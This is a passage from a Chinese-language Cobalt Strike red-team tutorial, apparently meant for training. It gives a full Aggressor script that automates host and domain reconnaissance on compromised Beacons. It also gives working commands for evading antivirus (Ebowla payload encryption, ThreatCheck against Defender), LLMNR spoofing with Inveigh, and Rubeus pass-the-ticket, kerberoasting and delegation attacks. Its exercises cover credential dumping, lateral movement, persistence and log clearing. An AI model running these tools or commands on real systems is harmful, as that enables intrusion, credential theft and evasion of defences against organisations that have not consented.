3. 有了本地管理员哈希，横向移动很容易
4. SMB Beacon适合内网使用
5. SOCKS代理方便后续操作

---

## 📚 案例4：Aggressor脚本编写实战

### 场景描述
编写一个实用的Aggressor脚本，
实现一键信息收集功能。

### 脚本编写

**功能需求：**
1. 添加一个右键菜单
2. 一键收集系统信息
3. 一键收集域信息
4. 自动保存结果

**脚本代码：**

```sleep
# quick_recon.cna
# 一键信息收集脚本

# 全局变量
$script_version = "1.0";

# 打印脚本信息
println("[*] 加载 Quick Recon 脚本 v$script_version");
println("[*] 作者：RedTeam");

# 添加Beacon右键菜单
popup beacon_bottom {
    menu "Quick Recon" {
        # 分隔符
        separator();

        # 系统信息收集
        item "系统信息收集" {
            $bid = $1;
            println("[*] 在 Beacon $bid 上执行系统信息收集...");

            binput($bid, "echo ========== 系统信息 ==========");
            binput($bid, "systeminfo");
            binput($bid, "echo.");
            binput($bid, "echo ========== 用户信息 ==========");
            binput($bid, "whoami /all");
            binput($bid, "echo.");
            binput($bid, "echo ========== 网络配置 ==========");
            binput($bid, "ipconfig /all");
            binput($bid, "echo.");
            binput($bid, "echo ========== 网络连接 ==========");
            binput($bid, "netstat -ano");
            binput($bid, "echo.");
            binput($bid, "echo ========== 进程列表 ==========");
            binput($bid, "tasklist /v");
            binput($bid, "echo.");
            binput($bid, "echo ========== 服务列表 ==========");
            binput($bid, "net start");
            binput($bid, "echo.");
            binput($bid, "echo ========== 本地用户 ==========");
            binput($bid, "net user");
            binput($bid, "echo.");
            binput($bid, "echo ========== 本地管理员组 ==========");
            binput($bid, "net localgroup administrators");
            binput($bid, "echo.");
            binput($bid, "echo ========== 启动项 ==========");
            binput($bid, "wmic startup get command,name,user");
        }

        # 域信息收集
        item "域信息收集" {
            $bid = $1;
            println("[*] 在 Beacon $bid 上执行域信息收集...");

            binput($bid, "echo ========== 域信息 ==========");
            binput($bid, "net user /domain");
            binput($bid, "echo.");
            binput($bid, "echo ========== 域管理员 ==========");
            binput($bid, "net group \"domain admins\" /domain");
            binput($bid, "echo.");
            binput($bid, "echo ========== 域计算机 ==========");
            binput($bid, "net group \"domain computers\" /domain");
            binput($bid, "echo.");
            binput($bid, "echo ========== 域控 ==========");
            binput($bid, "nltest /dsgetdc:");
            binput($bid, "echo.");
            binput($bid, "echo ========== 域信任 ==========");
            binput($bid, "nltest /domain_trusts");
        }

        # 全部收集
        item "全部收集" {
            $bid = $1;
            println("[*] 在 Beacon $bid 上执行全部信息收集...");

            # 先执行系统信息
            binput($bid, "echo ========== 系统信息 ==========");
            binput($bid, "systeminfo");
            binput($bid, "whoami /all");
            binput($bid, "ipconfig /all");
            binput($bid, "netstat -ano");
            binput($bid, "tasklist /v");
            binput($bid, "net start");
            binput($bid, "net user");
            binput($bid, "net localgroup administrators");

            # 再执行域信息
            binput($bid, "echo ========== 域信息 ==========");
            binput($bid, "net user /domain");
            binput($bid, "net group \"domain admins\" /domain");
            binput($bid, "net group \"domain computers\" /domain");
            binput($bid, "nltest /dsgetdc:");
            binput($bid, "nltest /domain_trusts");
        }

        separator();
    }
}

# 新Beacon上线自动收集基本信息
on beacon_initial {
    $bid = $1;
    $info = beacon_info($bid);

    println("[+] 新Beacon上线: $info[user]@$info[computer] ($info[ip])");

    # 自动收集基本信息
    println("[*] 自动收集基本信息...");
    binput($bid, "whoami");
    binput($bid, "hostname");
    binput($bid, "ipconfig");
}

println("[+] Quick Recon 脚本加载完成！");
```

### 使用方法

1. 保存为 `quick_recon.cna`
2. 在CS中打开 Script Manager
3. 点击 Load，选择脚本文件
4. 在任意Beacon上右键，就能看到 "Quick Recon" 菜单
5. 点击对应的功能即可

### 经验总结
1. Aggressor Script并不难，语法很简单
2. 常用的功能可以写成脚本，提高效率
3. 社区有很多优秀的脚本，可以参考学习
4. 脚本写多了，自然就熟练了
5. 自动化是红队的必备技能

---

## 📚 案例5：CS常用插件推荐与使用

### 场景描述
推荐几个实用的CS插件，
并演示如何使用。

### 插件一：Ebowla

**功能：** Payload加密免杀

**使用方法：**

```bash
# 下载Ebowla
git clone https://github.com/Genetic-Malware/Ebowla.git

# 使用方法
python2.7 Ebowla.py -h

# 生成加密的Payload
python2.7 Ebowla.py -p payload.bin -o output.exe -t exe -e aes
```

然后把生成的exe
在目标上运行即可。

### 插件二：ThreatCheck

**功能：** 检测文件哪部分被查杀

**使用方法：**

```bash
# 编译ThreatCheck
# 或直接下载编译好的

# 使用
ThreatCheck.exe -f beacon.exe -e Defender
```

它会把文件分成很多块，
依次检测哪块被查杀，
帮你定位需要修改的地方。

### 插件三：Inveigh

**功能：** LLMNR/NBT-NS/mDNS欺骗

**使用方法：**

```
beacon> execute-assembly /tools/Inveigh.exe
# 运行Inveigh进行欺骗
```

或者用PowerShell版本：

```
beacon> powershell-import Inveigh.ps1
beacon> powershell Invoke-Inveigh -ConsoleOutput Y
```

### 插件四：Rubeus

**功能：** Kerberos票据操作

**使用方法：**

```
beacon> execute-assembly /tools/Rubeus.exe asktgt /user:user /domain:corp.com /rc4:hash /ptt
# 请求TGT

beacon> execute-assembly /tools/Rubeus.exe kerberoast /outfile:hashes.txt
# Kerberoasting

beacon> execute-assembly /tools/Rubeus.exe s4u /user:user /rc4:hash /impersonateuser:admin /msdsspn:cifs/server /ptt
# 约束委派攻击
```

### 插件五：BOF合集

**功能：** 大量实用的BOF

BOF（Beacon Object File）
是一种轻量级的Beacon扩展，
执行速度快，体积小。

常用的BOF：
- 端口扫描
- 信息收集
- 提权辅助
- 凭据获取
- 等等...

**使用方法：**

```
beacon> inline-execute /bof/portscan.o 192.168.1.0/24 445
# 执行端口扫描BOF
```

### 经验总结
1. CS插件能大大提高工作效率
2. 选择适合自己的插件，不要贪多
3. 使用第三方插件注意安全
4. 最好能自己写一些简单的脚本
5. 关注社区，及时发现好的插件

---

## ✏️ 习题（20道）

### 一、选择题（5题）

1. 以下哪个命令可以导出本地用户哈希？
   - A. hashdump
   - B. logonpasswords
   - C. getsystem
   - D. screenshot

2. Beacon默认的端口转发命令是？
   - A. proxychains
   - B. portfwd
   - C. frp
   - D. ssh

3. CS使用的脚本语言叫什么？
   - A. Python
   - B. PowerShell
   - C. Aggressor Script（Sleep）
   - D. Lua

4. 以下哪个不是CS的横向移动方法？
   - A. psexec
   - B. wmi
   - C. winrm
   - D. hydra

5. 以下哪个命令可以清除系统日志？
   - A. clearev
   - B. rm
   - C. del
   - D. format

### 二、填空题（5题）

6. Beacon启动SOCKS代理的命令是__________。

7. 导出内存中登录凭据的命令是__________。

8. CS中通过命名管道通信的Beacon叫做__________ Beacon。

9. 尝试获取System权限的命令是__________。

10. 键盘记录的命令是__________。

### 三、简答题（5题）

11. 简述CS中横向移动的几种方法及各自的特点。

12. portfwd和rportfwd有什么区别？各适用于什么场景？

13. 什么是浏览器Pivoting？它有什么用途？

14. 什么是Aggressor Script？它可以用来做什么？

15. 简述CS中权限维持的几种方法。

### 四、实操题（5题）

16. 在测试环境中，使用CS的hashdump和logonpasswords获取凭据，并保存到凭据数据库中。

17. 使用CS进行横向移动：从一台机器通过psexec/wmi横向移动到另一台机器。

18. 配置SOCKS代理，并通过代理访问内网资源。

19. 编写一个简单的Aggressor Script脚本，添加一个自定义右键菜单。

20. 实践CS的权限维持功能，使用至少两种不同的持久化方式。

---

::: tip 本章小结
这一章我们学习了Cobalt Strike的进阶功能。

主要内容：
1. Beacon命令详解（30+常用命令）
2. 权限提升模块（getsystem、elevate）
3. 凭据获取模块（hashdump、logonpasswords、keylogger、screenshot）
4. 横向移动模块（psexec、wmi、winrm、ssh等）
5. 内网代理与转发（SOCKS、portfwd、rportfwd）
6. 钓鱼攻击模块（鱼叉钓鱼、网站克隆、系统分析器）
7. 浏览器Pivoting
8. Aggressor Script脚本编写
9. 插件开发入门
10. 权限维持
11. 痕迹清理
12. 常用插件推荐

CS的功能非常强大，
需要在实战中不断练习
才能真正掌握。

下一章我们会学习
CS的高级功能——
流量隐匿技术，
包括Malleable C2、
重定向、CDN隐藏等。

继续加油！
:::
